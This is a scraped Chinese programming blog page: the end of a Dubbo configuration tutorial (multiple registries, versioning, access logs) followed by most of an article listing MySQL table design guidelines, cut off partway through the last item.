<p>说明： <code>protocol</code>  属性，可以用 <code>,</code>  隔开，使用多种协议。</p>
<h3 id="198-多注册中心"><a class="markdownIt-Anchor" href="#198-多注册中心">#</a> 1.9.8 多注册中心</h3>
<p><code>Dubbo</code>  支持同一服务向多注册中心同时注册，或者不同服务分别注册到不同的注册中心上去，甚至可以同时引用注册在不同注册中心上的同名服务。</p>
<p><strong>服务端多注册中心发布服务</strong></p>
<p>一个服务可以在不同的注册中心注册，当一个注册中心出现问题时，可以用其他的注册中心。</p>
<p><strong>注册</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--多注册中心--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">protocol</span>=<span class="string">&quot;zookeeper&quot;</span> <span class="attr">id</span>=<span class="string">&quot;reg1&quot;</span> <span class="attr">timeout</span>=<span class="string">&quot;10000&quot;</span> <span class="attr">address</span>=<span class="string">&quot;localhost:2181&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">protocol</span>=<span class="string">&quot;zookeeper&quot;</span> <span class="attr">id</span>=<span class="string">&quot;reg2&quot;</span> <span class="attr">timeout</span>=<span class="string">&quot;10000&quot;</span> <span class="attr">address</span>=<span class="string">&quot;localhost:2182&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">protocol</span>=<span class="string">&quot;zookeeper&quot;</span> <span class="attr">id</span>=<span class="string">&quot;reg3&quot;</span> <span class="attr">timeout</span>=<span class="string">&quot;10000&quot;</span> <span class="attr">address</span>=<span class="string">&quot;localhost:2183&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>发布服务</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--服务发布的配置，需要暴露的服务接口--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">cluster</span>=<span class="string">&quot;failover&quot;</span> <span class="attr">retries</span>=<span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">ref</span>=<span class="string">&quot;providerService&quot;</span> <span class="attr">registry</span>=<span class="string">&quot;reg1&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">cluster</span>=<span class="string">&quot;failover&quot;</span> <span class="attr">retries</span>=<span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">ref</span>=<span class="string">&quot;providerService&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;rmi&quot;</span> <span class="attr">registry</span>=<span class="string">&quot;reg2&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明：使用 <code>registry=&quot;reg2&quot;</code>  指定该接口使用的注册中心，同时也可以使用多个 <code>，</code> 用，隔开，例如， <code>registry=&quot;reg1,,reg2&quot;</code> 。</p>
<p><strong>消费端多注册中心引用服务</strong></p>
<p>首先，先向不同注册中心注册；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--多注册中心--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">protocol</span>=<span class="string">&quot;zookeeper&quot;</span> <span class="attr">id</span>=<span class="string">&quot;reg1&quot;</span> <span class="attr">timeout</span>=<span class="string">&quot;10000&quot;</span> <span class="attr">address</span>=<span class="string">&quot;localhost:2181&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">protocol</span>=<span class="string">&quot;zookeeper&quot;</span> <span class="attr">id</span>=<span class="string">&quot;reg2&quot;</span> <span class="attr">timeout</span>=<span class="string">&quot;10000&quot;</span> <span class="attr">address</span>=<span class="string">&quot;localhost:2182&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">protocol</span>=<span class="string">&quot;zookeeper&quot;</span> <span class="attr">id</span>=<span class="string">&quot;reg3&quot;</span> <span class="attr">timeout</span>=<span class="string">&quot;10000&quot;</span> <span class="attr">address</span>=<span class="string">&quot;localhost:2183&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>其次，不同的消费端服务引用使用不同的注册中心；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--不同的服务使用不同的注册中心--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">cluster</span>=<span class="string">&quot;failover&quot;</span> <span class="attr">retries</span>=<span class="string">&quot;2&quot;</span> <span class="attr">check</span>=<span class="string">&quot;false&quot;</span> <span class="attr">id</span>=<span class="string">&quot;providerService&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span> <span class="attr">registry</span>=<span class="string">&quot;reg1&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">cluster</span>=<span class="string">&quot;failover&quot;</span> <span class="attr">retries</span>=<span class="string">&quot;2&quot;</span> <span class="attr">check</span>=<span class="string">&quot;false&quot;</span> <span class="attr">id</span>=<span class="string">&quot;providerService2&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span> <span class="attr">registry</span>=<span class="string">&quot;reg2&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明：上面分别使用注册中心 <code>1</code>  和注册中心 <code>2</code> 。</p>
<h3 id="199-多版本"><a class="markdownIt-Anchor" href="#199-多版本">#</a> 1.9.9 多版本</h3>
<p>不同的服务是有版本不同的，版本可以更新并且升级，同时，不同的版本之间是不可以调用的。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--服务发布的配置，需要暴露的服务接口--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">cluster</span>=<span class="string">&quot;failover&quot;</span> <span class="attr">retries</span>=<span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">ref</span>=<span class="string">&quot;providerService&quot;</span> <span class="attr">registry</span>=<span class="string">&quot;reg1&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0.0&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">cluster</span>=<span class="string">&quot;failover&quot;</span> <span class="attr">retries</span>=<span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">interface</span>=<span class="string">&quot;com.sihai.dubbo.provider.service.ProviderService&quot;</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">ref</span>=<span class="string">&quot;providerService&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;rmi&quot;</span> <span class="attr">registry</span>=<span class="string">&quot;reg2&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0.0&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>加入了版本控制。</p>
<h3 id="1910-日志管理"><a class="markdownIt-Anchor" href="#1910-日志管理">#</a> 1.9.10 日志管理</h3>
<p><code>dubbo</code>  也可以将日志信息记录或者保存到文件中的。</p>
<p>1、使用 <code>accesslog</code>  输出到 <code>log4j</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">accesslog</span>=<span class="string">&quot;true&quot;</span> <span class="attr">name</span>=<span class="string">&quot;dubbo&quot;</span> <span class="attr">port</span>=<span class="string">&quot;20880&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">accesslog</span>=<span class="string">&quot;true&quot;</span> <span class="attr">name</span>=<span class="string">&quot;rmi&quot;</span> <span class="attr">port</span>=<span class="string">&quot;1099&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>2、输出到文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">accesslog</span>=<span class="string">&quot;http://localhost/log.txt&quot;</span> <span class="attr">name</span>=<span class="string">&quot;dubbo&quot;</span> <span class="attr">port</span>=<span class="string">&quot;20880&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">accesslog</span>=<span class="string">&quot;http://localhost/log2.txt&quot;</span> <span class="attr">name</span>=<span class="string">&quot;rmi&quot;</span> <span class="attr">port</span>=<span class="string">&quot;1099&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-27T09:20:49.000Z" title="2023/4/27 17:20:49">2023-04-27</time>发表</span><span class="level-item"><time dateTime="2023-04-27T09:21:31.402Z" title="2023/4/27 17:21:31">2023-04-27</time>更新</span><span class="level-item">32 分钟读完 (大约4825个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/27/%E3%80%90MySql%E3%80%9121%E4%B8%AAMySQL%E8%A1%A8%E8%AE%BE%E8%AE%A1%E7%9A%84%E7%BB%8F%E9%AA%8C%E5%87%86%E5%88%99/">【MySql】21个MySQL表设计的经验准则</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h2 id="mysql21个mysql表设计的经验准则"><a class="markdownIt-Anchor" href="#mysql21个mysql表设计的经验准则">#</a> 【MySql】21 个 MySQL 表设计的经验准则</h2>
<div id="content_views" class="markdown_views prism-atom-one-dark"> 
 <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path> 
 </svg> 
 <h2><a id="1_0"></a>1.命名规范</h2> 
 <p>数据库表名、字段名、索引名等都需要命名规范，可读性高(一般要求用英文)，让别人一看命名，就知道这个字段表示什么意思。</p> 
 <p>比如一个表的账号字段，<strong>反例如下</strong>：</p> 
 <pre><code>acc_no,1_acc_no,zhanghao
</code></pre> 
 <p><strong>正例：</strong></p> 
 <pre><code>account_no,account_number
</code></pre> 
 <ul>
  <li>表名、字段名必须使用小写字母或者数字，禁止使用数字开头，禁止使用拼音，并且一般不使用英文缩写。</li>
  <li>主键索引名为<code>pk_字段名</code>；唯一索引名为<code>uk_字段名</code>；普通索引名则为<code>idx_字段名</code>。</li>
 </ul> 
 <h2><a id="2_18"></a>2.选择合适的字段类型</h2> 
 <p>设计表时，我们需要选择合适的字段类型，比如：</p> 
 <ul>
  <li>尽可能选择存储空间小的字段类型，就好像数字类型的，从<code>tinyint、smallint、int、bigint</code>从左往右开始选择</li>
  <li>小数类型如金额，则选择 <code>decimal</code>，禁止使用 <code>float</code> 和 <code>double</code>。</li>
  <li>如果存储的字符串长度几乎相等，使用 <code>char</code> 定长字符串类型。</li>
  <li><code>varchar</code>是可变长字符串，不预先分配存储空间，长度不要超过<code>5000</code>。</li>
  <li>如果存储的值太大，建议字段类型修改为<code>text</code>，同时抽出单独一张表，用主键与之对应。</li>
  <li>同一表中，所有<code>varchar</code>字段的长度加起来，不能大于<code>65535</code>. 如果有这样的需求，请使用<code>TEXT/LONGTEXT</code> 类型。</li>
 </ul> 
 <h2><a id="3__29"></a>3. 主键设计要合理</h2> 
 <p>主键设计的话，最好不要与业务逻辑有所关联。有些业务上的字段，比如身份证，虽然是唯一的，一些开发者喜欢用它来做主键，但是不是很建议哈。主键最好是毫无意义的一串独立不重复的数字，比如<code>UUID</code>，又或者<code>Auto_increment</code>自增的主键，或者是雪花算法生成的主键等等;</p> 
 <p><img src="https://img-blog.csdnimg.cn/img_convert/ccd1bc85b0ee0b89a50656597486178d.png" alt=""></p> 
 <h2><a id="4__35"></a>4. 选择合适的字段长度</h2> 
 <p>先问大家一个问题，大家知道数据库字段长度表示<strong>字符长度</strong>还是<strong>字节长度</strong>嘛？</p> 
 <blockquote> 
  <p>其实在mysql中，<code>varchar</code>和<code>char</code>类型表示字符长度，而其他类型表示的长度都表示字节长度。比如<code>char(10)</code>表示字符长度是10，而<code>bigint（4）</code>表示显示长度是<code>4</code>个字节，但是因为bigint实际长度是<code>8</code>个字节，所以bigint（4）的实际长度就是8个字节。</p> 
 </blockquote> 
 <p>我们在设计表的时候，需要充分考虑一个字段的长度，比如一个用户名字段（它的长度5~20个字符），你觉得应该设置多长呢？可以考虑设置为 <code>username varchar（32）</code>。字段长度一般设置为2的幂哈（也就是<code>2的n</code>次方）。’;</p> 
 <h2><a id="5_43"></a>5，优先考虑逻辑删除，而不是物理删除</h2> 
 <p>什么是物理删除？什么是逻辑删除？</p> 
 <ul>
  <li>物理删除：把数据从硬盘中删除，可释放存储空间</li>
  <li>逻辑删除：给数据添加一个字段，比如<code>is_deleted</code>，以标记该数据已经逻辑删除。</li>
 </ul> 
 <p>物理删除就是执行<code>delete</code>语句，如删除<code>account_no =‘666’</code>的账户信息SQL如下：</p> 
 <pre><code>delete from account_info_tab whereaccount_no ='666';
</code></pre> 
 <p>逻辑删除呢，就是这样：</p> 
 <pre><code>update account_info_tab set is_deleted = 1 where account_no ='666';
</code></pre> 
 <p><strong>为什么推荐用逻辑删除，不推荐物理删除呢？</strong></p> 
 <blockquote> 
  <ul>
   <li>为什么不推荐使用物理删除，因为恢复数据很困难</li>
   <li>物理删除会使自增主键不再连续</li>
   <li>核心业务表 的数据不建议做物理删除，只适合做状态变更。</li>
  </ul> 
 </blockquote> 
 <h2><a id="6_create_timemodifed_time_66"></a>6. 每个表都需要添加这几个通用字段如主键、create_time、modifed_time等</h2> 
 <p>表必备一般来说，或具备这几个字段：</p> 
 <ul>
  <li>id：主键，一个表必须得有主键，必须</li>
  <li>create_time：创建时间，必须</li>
  <li>modifed_time/update_time: 修改时间，必须，更新记录时，需要更新它</li>
  <li>version : 数据记录的版本号，用于乐观锁，非必须</li>
  <li>remark ：数据记录备注，非必须</li>
  <li>modified_by :修改人，非必须</li>
  <li>creator ：创建人，非必须</li>
 </ul> 
 <p><img src="https://img-blog.csdnimg.cn/img_convert/5c0c0ff67e3189ae7899070386491415.png" alt=""></p> 
 <h2><a id="7__80"></a>7. 一张表的字段不宜过多</h2> 
 <p>我们建表的时候，要牢记，一张表的字段不宜过多哈，一般尽量不要超过20个字段哈。笔者记得上个公司，有伙伴设计开户表，加了五十多个字段。。。</p> 
 <p>如果一张表的字段过多，表中保存的数据可能就会很大，查询效率就会很低。因此，一张表不要设计太多字段哈，如果业务需求，实在需要很多字段，可以把一张大的表，拆成多张小的表，它们的主键相同即可。</p> 
 <p>当表的字段数非常多时，可以将表分成两张表，一张作为条件查询表，一张作为详细内容表 (主要是为了性能考虑)。</p> 
 <h2><a id="8_not_null_88"></a>8. 尽可能使用not null定义字段</h2> 
 <p>如果没有特殊的理由， 一般都建议将字段定义为 <code>NOT NULL</code> 。</p> 
 <p><strong>为什么呢？</strong></p> 
 <ul>
  <li>首先， <code>NOT NULL</code> 可以防止出现空指针问题。</li>
  <li>其次，<code>NULL</code>值存储也需要额外的空间的，它也会导致比较运算更为复杂，使优化器难以优化SQL。</li>
  <li><code>NULL</code>值有可能会导致索引失效</li>
  <li>如果将字段默认设置成一个空字符串或常量值并没有什么不同，且都不会影响到应用逻辑， 那就可以将这个字段设置为<code>NOT NULL</code>。</li>
 </ul> 
 <h2><a id="9__99"></a>9. 设计表时，评估哪些字段需要加索引</h2> 
 <p>首先，评估你的表数据量。如果你的表数据量只有一百几十行，就没有必要加索引。否则设计表的时候，如果有查询条件的字段，一般就需要建立索引。但是索引也不能滥用：</p> 
 <ul>
  <li>索引也不要建得太多，一般单表索引个数不要超过<code>5</code>个。因为创建过多的索引，会降低写得速度。</li>
  <li>区分度不高的字段，不能加索引，如性别等</li>
  <li>索引创建完后，还是要注意避免索引失效的情况，如使用mysql的内置函数，会导致索引失效的</li>
  <li>索引过多的话，可以通过联合索引的话方式来优化。然后的话，索引还有一些规则，如覆盖索引，最左匹配原则等等。。</li>
 </ul> 
 <p>假设你新建一张用户表，如下：</p> 
 <pre><code>CREATE TABLE user_info_tab (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `age` int(11) DEFAULT NULL,
  `name` varchar(255) NOT NULL,
  `create_time` datetime NOT NULL,
  `modifed_time` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
</code></pre> 
 <p>对于这张表，很可能会有根据<code>user_id</code>或者<code>name</code>查询用户信息，并且，<code>user_id</code>是唯一的。因此，你是可以给<code>user_id</code>加上唯一索引，<code>name</code>加上普通索引。</p> 
 <pre><code>CREATE TABLE user_info_tab (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `age` int(11) DEFAULT NULL,
  `name` varchar(255) NOT NULL,
  `create_time` datetime NOT NULL,
  `modifed_time` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_name` (`name`) USING BTREE,
  UNIQUE KEY un_user_id (user_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
</code></pre> 
 <h2><a id="10__3NF_138"></a>10. 不需要严格遵守 3NF，通过业务字段冗余来减少表关联</h2> 
 <p>什么是数据库三范式（<code>3NF</code>），大家是否还有印象吗？</p> 
 <ul>
  <li>第一范式：对属性的原子性，要求属性具有原子性，不可再分解；</li>
  <li>第二范式：对记录的唯一性，要求记录有唯一标识，即实体的唯一性，即不存在部分依赖；</li>
  <li>第三方式：对字段的冗余性，要求任何字段不能由其他字段派生出来，它要求字段没有冗余，即不存在传递依赖；</li>
 </ul> 
 <p>我们设计表及其字段之间的关系, 应尽量满足第三范式。但是有时候，可以适当冗余，来提高效率。比如以下这张表</p> 
 <table>
  <thead>
   <tr>
    <th>商品名称</th>
    <th>商品型号</th>
    <th>单价</th>
    <th>数量</th>
    <th>总金额</th>
   </tr>
  </thead>
  <tbody>
   <tr>
    <td>手机</td>
    <td>华为</td>
    <td>8000</td>
    <td>5</td>
    <td>40000</td>
   </tr>
  </tbody>
 </table> 
 <p>以上这张存放商品信息的基本表。<code>总金额</code>这个字段的存在，表明该表的设计不满足第三范式，因为<code>总金额</code>可以由<code>单价*数量</code>得到，说明<code>总金额</code>是冗余字段。但是，增加<code>总金额</code>这个冗余字段，可以提高查询统计的速度，这就是以空间换时间的作法。</p> 
 <p>当然，这只是个小例子哈，大家开发设计的时候，要结合具体业务分析哈。</p> 
 <h2><a id="11_MySQL_156"></a>11. 避免使用MySQL保留字</h2> 
 <p>如果库名、表名、字段名等属性含有保留字时，<code>SQL</code>语句必须用反引号来引用属性名称，这将使得SQL语句书写、SHELL脚本中变量的转义等变得非常复杂。</p> 
 <p>因此，我们一般避免使用<code>MySQL</code>保留字，如<code>select、interval、desc</code>等等</p> 
 <h2><a id="12__162"></a>12. 不搞外键关联，一般都在代码维护</h2> 
 <p>什么是外键呢？</p> 
 <blockquote> 
  <p>外键，也叫<code>FOREIGN KEY</code>，它是用于将两个表连接在一起的键。<code>FOREIGN KEY</code>是一个表中的一个字段（或字段集合），它引用另一个表中的<code>PRIMARY KEY</code>。它是用来保证数据的一致性和完整性的。</p> 
 </blockquote> 
 <p>阿里的<code>Java</code>规范也有这么一条：</p> 
 <blockquote> 
  <p>【强制】<strong>不得使用外键与级联</strong>，一切外键概念必须在应用层解决。</p> 
 </blockquote> 
 <p>我们为什么不推荐使用<strong>外键</strong>呢？</p> 
 <blockquote> 
  <ul>
   <li>使用外键存在性能问题、并发死锁问题、使用起来不方便等等。每次做<code>DELETE</code>或者<code>UPDATE</code>都必须考虑外键约束，会导致开发的时候很难受,测试数据造数据也不方便。</li>
   <li>还有一个场景不能使用外键，就是分库分表。</li>
  </ul> 
 </blockquote> 
 <h2><a id="13_INNODB_177"></a>13. 一般都选择INNODB存储引擎</h2> 
 <p>建表是需要选择<strong>存储引擎</strong>的，我们一般都选择<code>INNODB</code>存储引擎，除非读写比率小于<code>1%</code>, 才考虑使用<code>MyISAM</code> 。</p> 
 <p>有些小伙伴可能会有疑惑，不是还有<code>MEMORY</code>等其他存储引擎吗？什么时候使用它呢？其实其他存储引擎一般除了都建议在<code>DBA</code>的指导下使用。</p> 
 <p>我们来复习一下这<code>MySQL</code>这三种存储引擎的对比区别吧：</p> 
 <table>
  <thead>
   <tr>
    <th>特性</th>
    <th>INNODB</th>
    <th>MyISAM</th>
    <th>MEMORY</th>
   </tr>
  </thead>
  <tbody>
   <tr>
    <td>事务安全</td>
    <td>支持</td>
    <td>无</td>
    <td>无</td>
   </tr>
   <tr>
    <td>存储限制</td>
    <td>64TB</td>
    <td>有</td>
    <td>有</td>
   </tr>
   <tr>
    <td>空间使用</td>
    <td>高</td>
    <td>低</td>
    <td>低</td>
   </tr>
   <tr>
    <td>内存使用</td>
    <td>高</td>
    <td>低</td>
    <td>高</td>
   </tr>
   <tr>
    <td>插入数据速度</td>
    <td>低</td>
    <td>高</td>
    <td>高</td>
   </tr>
   <tr>
    <td>是否支持外键</td>
    <td>支持</td>
    <td>无</td>
    <td>无</td>
   </tr>
  </tbody>
 </table> 
 <h2><a id="14__194"></a>14. 选择合适统一的字符集。</h2> 
 <p>数据库库、表、开发程序等都需要统一字符集，通常中英文环境用<code>utf8</code>。</p> 
 <p>MySQL支持的字符集有<code>utf8、utf8mb4、GBK、latin1</code>等。</p> 
 <ul>
  <li>utf8：支持中英文混合场景，国际通过，3个字节长度</li>
  <li>utf8mb4: &nbsp; 完全兼容utf8，4个字节长度，一般存储<strong>emoji表情</strong>需要用到它。</li>
  <li>GBK ：支持中文，但是不支持国际通用字符集，2个字节长度</li>
  <li>latin1：MySQL默认字符集，1个字节长度</li>
 </ul> 
 <h2><a id="15_comment_205"></a>15. 如果你的数据库字段是枚举类型的，需要在comment注释清楚</h2> 
 <p>如果你设计的数据库字段是枚举类型的话，就需要在<code>comment</code>后面注释清楚每个枚举的意思，以便于维护</p> 
 <p>正例如下：</p> 
 <pre><code>`session_status` varchar(2) COLLATE utf8_bin NOT NULL COMMENT 'session授权态 00：在线-授权态有效 01：下线-授权态失效 02：下线-主动退出 03：下线-在别处被登录'
</code></pre> 
 <p>反例：</p> 
 <pre><code>`session_status` varchar(2) COLLATE utf8_bin NOT NULL COMMENT 'session授权态'
</code></pre> 
 <p>并且，如果你的枚举类型在未来的版本有增加修改的话，也需要同时维护到<code>comment</code>后面。</p> 
 <h2><a id="16_222"></a>16.时间的类型选择</h2> 
 <p>我们设计表的时候，一般都需要加通用时间的字段，如<code>create_time、modified_time</code>等等。那对于时间的类型，我们该如何选择呢？</p> 
 <p>对于MySQL来说，主要有<code>date、datetime、time、timestamp 和 year</code>。</p> 
 <ul>
  <li>date ：表示的日期值, 格式<code>yyyy-mm-dd</code>,范围<code>1000-01-01 到 9999-12-31</code>，3字节</li>
  <li>time ：表示的时间值，格式 <code>hh:mm:ss</code>，范围<code>-838:59:59 到 838:59:59</code>，3字节</li>
  <li>datetime：表示的日期时间值，格式<code>yyyy-mm-dd hh:mm:ss</code>，范围<code>1000-01-01 00:00:00到</code>9999-12-31 23:59:59```,8字节，跟时区无关</li>
  <li>timestamp：表示的时间戳值，格式为<code>yyyymmddhhmmss</code>，范围<code>1970-01-01 00:00:01到2038-01-19 03:14:07</code>，4字节，跟时区有关</li>
  <li>year：年份值，格式为<code>yyyy</code>。范围<code>1901到2155</code>，1字节</li>
 </ul> 
 <p>推荐优先使用<code>datetime</code>类型来保存日期和时间，因为存储范围更大，且跟时区无关。</p> 
 <h2><a id="17_Stored_procedure___236"></a>17. 不建议使用Stored procedure (包括存储过程，触发器) 。</h2> 
 <p><strong>什么是存储过程</strong></p> 
 <p>已预编译为一个可执行过程的一个或多个SQL语句。</p> 
 <p><strong>什么是触发器</strong></p> 
 <p>触发器，指一段代码，当触发某个事件时，自动执行这些代码。使用场景：</p> 
 <ul>
  <li>可以通过数据库中的相关表实现级联更改。</li>
  <li>实时监控某张表中的某个字段的更改而需要做出相应的处理。</li>
  <li>例如可以生成某些业务的编号。</li>
  <li>注意不要滥用，否则会造成数据库及应用程序的维护困难。</li>
 </ul> 
 <p>对于MYSQL来说，存储过程、触发器等还不是很成熟， 并没有完善的出错记录处理，不建议使用。</p> 
 <h2><a id="18_1N__253"></a>18. 1:N 关系的设计</h2> 
 <p>日常开发中，<code>1</code>对多的关系应该是非常常见的。比如一个班级有多个学生，一个部门有多个员工等等。这种的建表原则就是：在从表（<code>N</code>的这一方）创建一个字段，以字段作为外键指向主表（<code>1</code>的这一方）的主键。示意图如下:</p> 
 <p><img src="https://img-blog.csdnimg.cn/img_convert/16838d39a5d92370407a0bb83f69c511.png" alt=""></p> 
 <p>学生表是多（<code>N</code>）的一方，会有个字段<code>class_id</code>保存班级表的主键。当然，一班不加外键约束哈，只是单纯保存这个关系而已。</p> 
 <p>有时候两张表存在<code>N:N</code>关系时，我们应该消除这种关系。通过增加第三张表，把<code>N:N</code>修改为两个 <code>1:N</code>。比如图书和读者，是一个典型的多对多的关系。一本书可以被多个读者借，一个读者又可以借多本书。我们就可以设计一个借书表，包含图书表的主键，以及读者的主键，以及借还标记等字段。</p> 
 <h2><a id="19__263"></a>19. 大字段</h2> 
 <p>设计表的时候，我们尤其需要关注一些大字段，即占用较多存储空间的字段。比如用来记录用户评论的字段，又或者记录博客内容的字段，又或者保存合同数据的字段。如果直接把表字段设计成text类型的话，就会浪费存储空间，查询效率也不好。</p> 
 <p>在MySQl中，这种方式保存的设计方案，其实是不太合理的。这种非常大的数据，可以保存到<code>mongodb</code>中，然后，在业务表保存对应<code>mongodb</code>的<code>id</code>即可。</p> 
 <p>这种设计思想类似于，我们表字段保存图片时，为什么不是保存图片内容，而是直接保存图片url即可。</p> 
 <h2><a id="20__271"></a>20. 考虑是否需要分库分表</h2> 
 <p><strong>什么是分库分表呢？</strong></p> 
 <ul>
  <li>分库：就是一个数据库分成多个数据库，部署到不同机器。</li>
 </ul> 
 <p><img src="https://img-blog.csdnimg.cn/img_convert/b2cf7a062366981d0097856ac608eb09.png" alt=""></p> 
 <ul>
  <li>分表：就是一个数据库表分成多个表。</li>
 </ul> 
 <p><img src="https://img-blog.csdnimg.cn/img_convert/4198e1532e4032a024e81f66f904f38c.png" alt=""></p> 
 <p>我们在设计表的时候，其实可以提前估算一下，是否需要做<strong>分库分表</strong>。比如一些用户信息，未来可能数据量到达百万设置千万的话，就可以提前考虑分库分表。</p> 
 <blockquote> 
  <p><strong>为什么需要分库分表</strong>: 数据量太大的话，SQL的查询就会变慢。如果一个查询SQL没命中索引，千百万数据量级别的表可能会拖垮整个数据库。即使SQL命中了索引，如果表的数据量超过一千万的话，查询也是会明显变慢的。这是因为索引一般是B+树结构，数据千万级别的话，B+树的高度会增高，查询就变慢啦。</p> 
 </blockquote> 
 <p>分库分表主要有水平拆分、垂直拆分的说法，拆分策略有<code>range范围、hash取模</code>。而分库分表主要有这些问题：</p> 
 <ul>
  <li>事务问题</li>
  <li>跨库关联</li>
  <li>排序问题</li>
  <li>分页问题</li>
  <li>分布式ID</li>
 </ul> 
 <h2><a id="21_sqL__295"></a>21. sqL 编写的一些优化经验</h2> 
 <p>最后的话，跟大家聊来一些写SQL的经验吧：</p> 
 <ul>
